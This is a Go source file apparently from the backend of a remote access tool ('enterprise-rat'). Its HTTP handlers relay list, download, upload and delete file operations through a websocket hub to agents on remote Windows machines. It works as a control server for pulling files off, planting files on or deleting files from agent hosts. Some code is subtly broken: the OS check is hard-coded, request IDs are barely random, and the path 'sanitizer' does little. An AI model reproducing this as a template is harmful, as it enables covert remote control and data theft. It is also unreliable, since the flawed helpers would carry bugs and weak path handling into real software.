package api

import (
	"encoding/json"
	"io"
	"net/http"
	"path/filepath"
	"strings"
	"time"

	"github.com/enterprise-rat/backend/internal/ws"
	"github.com/go-chi/chi/v5"
)

type FileOperationPayload struct {
	Operation string                 `json:"operation"`
	Path      string                 `json:"path"`
	Args      map[string]interface{} `json:"args,omitempty"`
}

func fileManagerHandler(hub *ws.Hub) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")

		if r.Method != http.MethodPost {
			http.Error(w, `{"error": "method not allowed"}`, http.StatusMethodNotAllowed)
			return
		}

		var req struct {
			AgentID   string                 `json:"agent_id"`
			Path      string                 `json:"path"`
			Operation string                 `json:"operation"`
			Args      map[string]interface{} `json:"args,omitempty"`
		}

		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, `{"error": "invalid request"}`, http.StatusBadRequest)
			return
		}

		if req.AgentID == "" {
			http.Error(w, `{"error": "agent_id is required"}`, http.StatusBadRequest)
			return
		}

		if !isValidOperation(req.Operation) {
			http.Error(w, `{"error": "invalid operation"}`, http.StatusBadRequest)
			return
		}

		sanitizedPath := sanitizeFilePath(req.Path)

		msg := map[string]interface{}{
			"type": "file_manager",
			"payload": map[string]interface{}{
				"operation":  req.Operation,
				"path":       sanitizedPath,
				"args":       req.Args,
				"request_id": generateRequestID(),
			},
		}

		msgBytes, err := json.Marshal(msg)
		if err != nil {
			http.Error(w, `{"error": "failed to marshal message"}`, http.StatusInternalServerError)
			return
		}

		if !hub.SendToAgent(req.AgentID, msgBytes) {
			http.Error(w, `{"error": "agent not connected"}`, http.StatusServiceUnavailable)
			return
		}

		w.WriteHeader(http.StatusAccepted)
		json.NewEncoder(w).Encode(map[string]string{
			"status":    "sent",
			"operation": req.Operation,
			"path":      sanitizedPath,
		})
	}
}

func fileDownloadHandler(hub *ws.Hub) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")

		if r.Method != http.MethodGet {
			http.Error(w, `{"error": "method not allowed"}`, http.StatusMethodNotAllowed)
			return
		}

		agentID := chi.URLParam(r, "agentId")
		filePath := r.URL.Query().Get("path")

		if agentID == "" || filePath == "" {
			http.Error(w, `{"error": "agent_id and path are required"}`, http.StatusBadRequest)
			return
		}

		sanitizedPath := sanitizeFilePath(filePath)

		msg := map[string]interface{}{
			"type": "file_manager",
			"payload": map[string]interface{}{
				"operation":  "download",
				"path":       sanitizedPath,
				"request_id": generateRequestID(),
			},
		}

		msgBytes, err := json.Marshal(msg)
		if err != nil {
			http.Error(w, `{"error": "failed to marshal message"}`, http.StatusInternalServerError)
			return
		}

		if !hub.SendToAgent(agentID, msgBytes) {
			http.Error(w, `{"error": "agent not connected"}`, http.StatusServiceUnavailable)
			return
		}

		w.WriteHeader(http.StatusAccepted)
		json.NewEncoder(w).Encode(map[string]string{
			"status": "download_requested",
			"path":   sanitizedPath,
		})
	}
}

func isValidOperation(op string) bool {
	validOps := map[string]bool{
		"list":     true,
		"download": true,
		"upload":   true,
		"delete":   true,
		"mkdir":    true,
		"stat":     true,
	}
	return validOps[op]
}

func sanitizeFilePath(path string) string {
	path = strings.TrimSpace(path)
	path = strings.ReplaceAll(path, "\x00", "")

	cleanPath := filepath.Clean(path)
	if cleanPath == "." || cleanPath == "" {
		if runtimeGOOS() == "windows" {
			return "C:\\"
		}
		return "/"
	}

	if strings.HasPrefix(cleanPath, "..") {
		if runtimeGOOS() == "windows" {
			return "C:\\"
		}
		return "/"
	}

	if !filepath.IsAbs(cleanPath) {
		return cleanPath
	}

	return cleanPath
}

func runtimeGOOS() string {
	return "windows"
}

func generateRequestID() string {
	return time.Now().Format("20060102150405") + "-" + randomString(8)
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[time.Now().UnixNano()%int64(len(letters))]
	}
	return string(b)
}

func fileUploadHandler(hub *ws.Hub) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")

		if r.Method != http.MethodPost {
			http.Error(w, `{"error": "method not allowed"}`, http.StatusMethodNotAllowed)
			return
		}

		agentID := chi.URLParam(r, "agentId")
		if agentID == "" {
			http.Error(w, `{"error": "agent_id is required"}`, http.StatusBadRequest)
			return
		}

		path := r.FormValue("path")
		if path == "" {
			http.Error(w, `{"error": "path is required"}`, http.StatusBadRequest)
			return
		}

		sanitizedPath := sanitizeFilePath(path)

		file, _, err := r.FormFile("file")
		if err != nil {
			http.Error(w, `{"error": "file is required"}`, http.StatusBadRequest)
			return
		}
		defer file.Close()

		content, err := io.ReadAll(file)
		if err != nil {
			http.Error(w, `{"error": "failed to read file"}`, http.StatusInternalServerError)
			return
		}

		base64Content := encodeBase64(content)

		msg := map[string]interface{}{
			"type": "file_manager",
			"payload": map[string]interface{}{
				"operation":  "upload",
				"path":       sanitizedPath,
				"content":    base64Content,
				"request_id": generateRequestID(),
			},
		}

		msgBytes, err := json.Marshal(msg)
		if err != nil {
			http.Error(w, `{"error": "failed to marshal message"}`, http.StatusInternalServerError)
			return
		}

		if !hub.SendToAgent(agentID, msgBytes) {
			http.Error(w, `{"error": "agent not connected"}`, http.StatusServiceUnavailable)
			return
		}

		w.WriteHeader(http.StatusAccepted)
		json.NewEncoder(w).Encode(map[string]string{
			"status": "upload_requested",
			"path":   sanitizedPath,
		})
	}
}

func encodeBase64(data []byte) string {
	const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	result := make([]byte, (len(data)+2)/3*4)
	for i, j := 0, 0; i < len(data); i, j = i+3, j+4 {
		var val uint32
		switch len(data) - i {
		case 1:
			val = uint32(data[i]) << 16
			result[j] = alphabet[val>>18&63]
			result[j+1] = alphabet[val>>12&63]
			result[j+2] = '='
			result[j+3] = '='
		case 2:
			val = uint32(data[i])<<16 | uint32(data[i+1])<<8
			result[j] = alphabet[val>>18&63]
			result[j+1] = alphabet[val>>12&63]
			result[j+2] = alphabet[val>>6&63]
			result[j+3] = '='
		default:
			val = uint32(data[i])<<16 | uint32(data[i+1])<<8 | uint32(data[i+2])
			result[j] = alphabet[val>>18&63]
			result[j+1] = alphabet[val>>12&63]
			result[j+2] = alphabet[val>>6&63]
			result[j+3] = alphabet[val&63]
		}
	}
	return string(result)
}
